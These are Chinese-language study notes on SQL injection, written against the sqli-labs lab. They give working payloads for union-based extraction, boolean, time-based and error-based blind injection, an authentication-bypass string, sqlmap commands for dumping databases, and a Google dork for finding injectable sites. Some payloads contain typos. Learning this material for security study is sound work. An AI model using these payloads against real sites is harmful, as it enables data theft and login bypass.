## SQL
- 数据库: 存放数据库的仓库, 对于动态的网页, 需要数据库提供数据内容
![[Pasted image 20230728200405.png]]
- SQL: 操作数据库的编程语言
	- 基本操作: 
		- 增`INSERT` 
		- 删`DELETE` 
		- 改`ALTER`(改表结构), `UPDATE`(改表数据) 
		- 查`SELECT`
	- 特殊操作: 创建/访问视图, 访问sys表, 按格式输出等
	- /\*\*/ 内联注释, 用于绕过防火墙过滤空格的规则
	- SQL注入挖到就是高危
	- `order by 1` 第一列
### MySQL系统表
- `information_schema`
	- `SCHEMATA`: 当前mysql实例中所有数据库的信息
		- `show databases`结果取自此表
	- `TABLES`: 数据库中表的信息, 每个表属于哪个schema, 表类型, 表引擎, 创建时间等
		- `show tables from schemaname`
	- `COLUMN`: 表中的列信息, 某张表的所有列以及每个列的信息
		- `show column from schemaname.tablename`
![[Pasted image 20230728211108.png]]

## SQL注入
利用现有应用程序, 将而已的SQL命令注入到程序后台并在数据库引擎执行的能力
SQL注入漏洞是WEB应用程序对用户输入的数据合法性判断不严格导致
攻击者把SQL命令语句作为数据, 传输到服务器, 被SQL解释器正确解析执行, 数据库把查询到的结果返回给服务器, 呈现到前端(攻击者), 攻击者获得数据库内信息

## SQL注入基本原理
- 当web应用向后台数据库传递*SQL语句*进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理, 那么攻击者就可以构造特殊的SQL语句, 直接输入数据库引擎执行, **获取或修改数据库中的数据**
- 本质: 把用户输入的数据当作代码来执行, 违背了**"数据与代码分离"** 的原则
- 两个关键点:
	- 用户能够控制输入的内容
	- Web应用把用户输入的内容带入到数据库中执行

### SQL注入的危害
- 盗取网站的敏感信息
- 绕过网站后台认证
	- 登录后台语句: `SELECT * FROM admin WHERE username = 'user' and password = 'pass'`; `SELECT * FROM admin WHERE id = '1'` ^8e5d25
	- 万能密码: `' or '1' = '1' #` 值必为1
- 借助SQL注入漏洞提权获取系统权限
- 读取文件信息

### SQL注入的分类
- 根据位置分类: GET, POST, Head头注入
- 根据反馈结果分类: 有回显(显错注入), 无回显(盲注)
- 根据数据类型分类:
	- 数字型: 输入的参数位整型, 如id, 年龄, 页码等
	- 字符型: 输入的参数为字符串
	***其两者最大的区别在于: 数字型不需要单引号闭合, 字符串型一般需要单引号闭合***

### 判断是否存在sql注入
用引号进行闭合测试

### SQL注入流程(get)
- 以mysql数据库为例, 这也是现如今被开发者使用得最多的数据库系统
1. 寻找注入点, 在网页中的搜索框(URL地址栏)尝试能否注入(是否有回显)
2. 判断闭合方式: 字符串型/数字型, 单引号括号
	- `?id=1asdf'`
		- 有报错: 数字型, 无闭合或)闭合
		- 无报错: 字符型, 再判断闭合方式(`'`, `"`, `')`, `")`)
3. 验证漏洞: 是否能按照期望回显
	- `?id=1' and 1 --+` 正常显示 (--+是注释, url中的'+'会被翻译成空格, mysql也可以使用'#')
	- `?id=1' and 0 --+` 无显示
4. 判断列数和回显位: order by 和 union select
	- 列数: `?id=1' order by 3 --+` (在mysql中orderby可以指定用于排序的列在SELECT语句结果集中的位置, 所以此处枚举可回显的最大序号列)
	- 回显位: `?id=-1' union select 1,2,3 --+` (联合查询的数量取决于上一步所获取到的列数(必须相同才能联合查询), 查看所有列中第几位能够回显, 重要的是让前面一个表达式为空/False)
5. 取数据: 
	- 库名: `database()` 替换可以回显的位置
	- 表名: `(select group_concat(table_name) from information_schema.tables where table_schema=database())` 替换回显位
	- 列名(users): `(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')` 替换回显位
	- 具体数据(username): `(select group_concat(username) from users)`
- 注入完成: **可以任意获取数据库内的数据**

### POST型注入
- 不在url处注入, 而是在post报文中, 使用Burp注入(也可以使用hackbar的postdata)
- 寻找注入点, 根据相应报错信息和返回报文进行注入
- sqli-labs-less11


# 盲注
- 盲注就是在SQL过程中, 找到注入点后, 执行SQL语句后, 选择的数据或错误信息不能回显到前端页面, 要利用一些方法进行判断或猜测

## 盲注的分类
- 基于布尔判断
- 基于时间延迟
- 基于报错显示

## 盲注常用函数 (mysql)
- `substr(string, start, length)`
	- 功能: 截取字符串
	- 返回值: 截取后的字符串
	- 参数: string:原字符串; start:开始位置(从1开始); length:截取长度
- `mid(column_name, start, length)`
	- 和substr函数完全相同
- `left(string, n)`
	- 功能: 截取字符串string最左边的n位
	- 返回值: string最左边的n位组成的字符串
	- 参数: string:原字符串; n:个数(长度)
- `right(string, n)`
	- 功能: 截取字符串string最右边的n位, 返回值和参数与left()
	- `right(database(),1)> 'a'` -- 判断数据库名最后一个字符是否大于a; 再查看其它位
- `ord(char)`
	- 功能: 返回字符char的ascii码, **有时又服务器会对单引号进行转义, 使用ASCII码就不用使用单引号参数**
	- 返回值: 字符串, 字符char的ascii码
	- 参数: char:操作字符(串)
- `ascii(str)`
	- 功能: 返回字符或字符串str最左边的ascii码, 功能和ord()相同
	- `ascii(mid(database(),1,1))>114` -- 判断database()的第一位ASCII是否大于114('r')
- `length(string)`
	- 功能: 返回字符串string的长度
	- `length(DATABASE())>5` -- 判断数据库名长度大于5
- `ifnull(str1, str2)`
	- 功能: 根据第一个参数是否为null返回具体的值, 如果str1!=null, 返回str1; 如果str1\==null, 返回str2
	- 参数: str1和str2分别为两个字符串

#### ascii码
在计算机中, 所有的数据在存储和运算时都要使用二进制数表示(应为计算机用高电平和低电平分别表示1和0), 例如, 像a, b, c这样的52个字母(包括大写)以及0, 1等数字还有一些常用的符号(!@#等)在计算机中存储时也要使用二进制数来表示, 而具体用哪些二进制数字表示哪个符号, 每个人都可以约定自己的一套(编码), 而大家如果想要互相通信不造成混乱, 那么大家就必须使用相同的编码规则

ASCII码使用指定的7位或8位二进制数组合来表示128或256种可能的字符. 标准的ASCII码也叫基础ASCII码, 使用7位二进制数(剩下一位置0)来表示所有的大写和小写字母, 数字0到9, 标点符号, 以及在美式英语中使用的特殊控制字符


## 布尔盲注
- 是利用SQL语句**逻辑与**(and)操作, 判断and两边的条件是否成立, SQL语句带入数据库查询后判断返回内容(通常返回值仅有空和非空两种状态), 类似布尔型的true和false. 类似于一个人, 只能点头摇头来传递信息
- 特性: 对于用户执行的SQL语句, 只有两种页面显示, 利用SQL判断语句正确与否, 达到获取数据的目的

### 布尔盲注的流程
1. 确定注入点
	- `?id=1''`
	- 添加单引号/双引号一次/两次, 来判断判断注入点以及闭合方式
2. 判断数据库版本
	- `left(version(), 1)=5 --+` 5.0以上的版本可以使用information_schema数据库
3. 判断当前查询数据库名的长度
	- `length(database())=3 --+` 枚举最后的数字, 尝试长度
4. 猜解当前数据库名称
	- `ascii(substr(database(),1,1))>95 --+` 依次查看字符串名称的值
	- Burp的Intruder模块爆破, 调整Payloads
5. 猜解数据表的数量
	- `(select count(table_name) from information_schema.tables where table_schema=database())=4 --+`
6. 猜解数据表第一个名称的长度
	- `length((select count(table_name) from information_schema.tables where table_schema=database() limit 0,1))=6 --+` length()只接收一个参数, 所以里面的嵌套查询需要括起来(limit部分的逗号) , 二分法
7. 猜解第一个数据表名称的第一个字符
	- `ascii(substr((select table_name from information _schema.tables where table_schema=database() limit 0,1),1,1))>95 --+` 使用第6步获取的名称的子句, 取子字符串查询, 修改substr()的第二个参数猜解不同位置字符
8. 猜解数据表中字段(列)数量
	- `(select count(column_name) from information_schema.columns where table_schema=database() and table_name="emails")=2 --+`
9. 猜解数据表中第一个字段的名称长度
	- `length((select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1))=2 --+`
10. 猜解第数据表中第一个字段的第一个字符
	- `ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),1,1))>97 --+`
11. 获取字段中的记录
	- `ascii(substr((select group_concat(id) from emails),1,1))=49`

### Post盲注
- 通过执行不同的SQL命令, 根据网页返回的post报文, 进行盲注
- 使用Burp的Proxy, Intruder和Repeater功能
- sqli-labs的lession-15
- 判断闭合方式时, 因正确数据未知, 故使用 `随机数据 or 1=1#`, 随机数据的闭合方式正确则1=1生效, 返回True

## 报错盲注
- 如果Web没有正常的错误回显, 就只能通过输入错误格式的语句(函数), 使数据库报错, 并在报错信息中加入想要获取的数据
### xpath语法错误
#### extractvalue()
- 正常语法: `extractvalue(xml_document, Xpath_string);`
	- xml_document: xml文档对象的名称, string格式
	- Xpath_string: xpath格式的字符串, **如果不符合xpath格式, 则会报错, 并将报错结果放在报错信息中**
- 作用: 从目标xml中返回包含所查询值的字符串
- payload: `id='and(select extractvalue("anything",concat('~',(select语句))))`
	- 查库名: `(select extractvalue(1,concat('~',(select database()))))`
	- 查数据库版本: `(select extravalue(1, concat(0x7e,@@version)))`
	- 查表名: `(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))`
	- 查字段名: `(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))))`
	- 查数据: `(select extractvalue(1,concat(0x7e,(select group_concat(COLUMN_NAMES) from TABLE_NAME))))`
- 注: 
	- `0x7e` = '~', 也可以换成'#' '$'等不满足xpath格式的字符
	- mysql中`version()`=`@@version`; `concat('a','b')`="ab"
	- extractvalue()能查询字符串长度**最大为32**, 如果结果超过32则需要使用substring()截取或使用limit分页

#### updatexml()
- 正常语法: `updatexml(xml_document,xpath_string,new_value)`
	- new_value: string格式, 替换查找到的符合条件的数据
- 作用: 改变文档中符合条件的节点的值
- payload: `id=' and (select updatexml("anything",concat('~',(select...)),"anything"))` (在extractvalue基础上多一个任意参数)
	- 查数据库版本: `(select updatexml(1,concat(0x7e,@@version),1))`

### concat+rand()+group_by()导致主键重复
- 本质上基于`floor(rand(0)*2)`的重复性, 导致group by语句出错
- group by key的原理是循环读取数据的每一行, 将结果保存在一个临时表中. 读取每一行的key时, 如果key存在于临时表中, 则不在临时表中更新数据; 如果key不再临时表中, 则在临时表中插入key所在**行**的数据
- 利用方式: `floor(rand(0)*2)` , 会生成0或1两个数
	- `rand()`: 生成0~1之间的随机数, 可以给定一个随机数的种子. 对于每个给定的种子, rand()都会产生一系列可以重复出现的数字
	- `floor()`: 对任意正/负十进制值向下取整
- payload: `union select 1 from(select count(*),concat((select...),floor(rand(0)*2))x from TABLE_NAME group by x` 
	- 获取不同数据只需修改select...部分即可
	- 爆数据库名: `union select 1 from (select count(*),concat((select database())," ",floor(rand(0)*2))x from information_schema.tables group by x)a`

### NAME_CONST()
- `NAME_CONST(column_name, const_value)`
	- column_name: 一个可作为列名的字符串
	- const_value: 常量值
- 返回给定的常量值const_value, 如果用来产生一个集列, 那么列名为column_name
- 等同于 select const_value as column_name
- mysql列名重复会导致报错, NAME_CONST制造一个列; 使用join同时创建两个相同的列造成列名重复
- payload: `exists(select * from (select * from(select name_const(version(),0))a join (select name_const(version(),0))b)c)` (爆数据库版本)


## 时间盲注(延时注入)
- 如果同时既没有布尔回显以及错误回显, 则只能通过延时注入, 根据浏览器页面的相应时间来判断正确的数据
- 通过`and sleep(5)`来判断页面的响应时间, 在五秒多一点则说明此处可以延时注入
- `if(a, b, c)`: a是判断语句, 如果a的结果为真, 则返回b; 如果a的结果为假, 则返回c
### sleep()
- 使用与布尔盲注相似的条件, if()函数来使如果为真则执行sleep()函数
- payload: `if((length(database())=4),sleep(5),1)

### BENCHMARK()
- `BENCHMARK(count,expr)` 重复count次执行表达式expr, 可以用于计时MySQL处理表达式的速度, 返回值为0, 仅显示时间
- 特性
	- 无论expr表达式的语句执行结果为True, False或Null, benchmark都会正常执行
	- expr表达式仅支持查询单行单列的结果, 反之则报错
	- benchmark内的语句执行失败, benchmark同样执行失败
- 选择一些耗时较长的函数如:md5(), sha()等
- payload: `if((length(database())=4),(select benchmark(10000000,md5(0x41))),1)`

# Sqlmap注入

### 漏洞挖掘
- 漏洞挖掘是指对用用程序中位置漏洞的探索, 通过综合应用应用各种技术和工具, 尽可能地找出其中的潜在漏洞. 一般情况下漏洞挖掘针对单一的应用系统, 通过端口扫描, 目录扫描, 文件扫描等方式对其进行信息收集, 然后再进行漏洞挖掘

#### OWASP TOP 10
- 是由Web应用程序安全项目(OWASP)建立的公开共享的10给最关键的Web应用程序安全漏洞列表. 根据OWASP, 漏洞使应用程序中的一个弱点, 它允许恶意方(攻击者)对应用程序的利益相关者(所有者, 用户等)造成伤害

#### 主流漏洞挖掘工具
- Burp Suite
- Sqlmap
- Xray
- AWVS
- Nessus
- Metasploit

## sqlmap使用
https://sqlmap.org
- sqlmap是一个使用python语言开发的开源的渗透测试工具, 可以用来进行自动化检测, 利用SQL注入漏洞, 获取数据库服务器的权限. 它具有功能强大的检测引擎, 针对各种不同类型数据库的渗透测试的功能选项, 包括获取数据库中存储的数据, 访问操作系统文件, 甚至可以通过外带数据连接的方式执行操作系统命令, 

#### 测试单目标(GET型)
- 例: `python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1&page=10 -p page -batch`
- -u: 指定URL
- -p: 指定注入点
- -batch自动化测试, 需要选择全部默认Y (时间较长)
- --dbs: 获取数据库名
- -D: 指定数据库名
- --tables: 获取数据库表名
- -T: 指定表名
- --columns: 获取字段名
- -C: 指定字段名
- --dump: 获取数据(拖库), ***!!!无授权情况下禁止使用!!!***

#### 测试多目标(GET型)
- -m: 指定目标文件, 测试文件内容中的所有目标

#### 测试POST型注入
- -r: 指定要测试的数据包(txt文件), 里面有post请求包

## SQL注入漏洞寻找及提交
### google hacking
- sql常见特征: `?id=1` `?xxx=xxx`
- google hacking语法: `inurl:?id=1`
